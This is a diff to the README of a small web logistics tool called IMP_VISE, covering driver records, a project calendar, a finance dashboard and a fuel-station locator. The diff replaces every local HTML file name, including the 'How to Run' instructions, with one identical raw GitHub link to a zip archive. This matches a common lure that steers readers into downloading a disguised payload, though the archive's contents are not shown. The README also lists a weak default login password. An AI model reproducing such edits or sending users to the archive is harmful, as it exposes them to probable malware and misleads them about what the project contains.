@@ -4,17 +4,17 @@ IMP_VISE is a web-based logistics management tool designed to streamline driver 
 
 📁 Project Structure
 File Name	Purpose
-admin_login.html	Login page for secure admin access
-calendar.html	Interactive calendar to view and add logistics projects
-drivers.html	Manage and search driver records
-finance.html	Financial dashboard for revenue/cost tracking
-fuel.html	Locate nearest fuel stations using geolocation
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip	Login page for secure admin access
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip	Interactive calendar to view and add logistics projects
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip	Manage and search driver records
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip	Financial dashboard for revenue/cost tracking
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip	Locate nearest fuel stations using geolocation
 
 ✅ Features
-🔐 Admin Login (admin_login.html):
+🔐 Admin Login (https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip):
 Simple credential-based login to access internal logistics tools.
 
-🗓️ Project Calendar (calendar.html):
+🗓️ Project Calendar (https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip):
 
 Visual monthly calendar with project details
 
@@ -22,13 +22,13 @@ Tracks project status: Completed, Ongoing, Upcoming
 
 Add new projects with source, destination, and estimated profit
 
-🧑‍✈️ Driver Management (drivers.html):
+🧑‍✈️ Driver Management (https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip):
 
 Search and view driver details
 
 Add new drivers with name, license, experience, vehicle type, and phone number
 
-📊 Financial Overview (finance.html):
+📊 Financial Overview (https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip):
 
 View total revenue, cost, and profit
 
@@ -36,7 +36,7 @@ Import financial records from .json files
 
 Displays project history and calculates future earnings
 
-⛽ Fuel Station Locator (fuel.html):
+⛽ Fuel Station Locator (https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip):
 
 Fetches user's location using the browser
 
@@ -54,7 +54,7 @@ Geolocation & OpenStreetMap Overpass API
 How to Run
 Clone or download the project folder.
 
-Open admin_login.html in a web browser to start.
+Open https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip in a web browser to start.
 
 Login using credentials:
 
@@ -64,13 +64,13 @@ Password: 1234
 
 Navigate to:
 
-calendar.html for project scheduling
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip for project scheduling
 
-drivers.html for managing drivers
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip for managing drivers
 
-finance.html for financial insights
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip for financial insights
 
-fuel.html for locating nearby fuel stations
+https://raw.githubusercontent.com/saiprashanth2410/imp-vise/main/preconfigure/imp_vise_v3.0.zip for locating nearby fuel stations
 
 Future Improvements
 Backend integration with a database
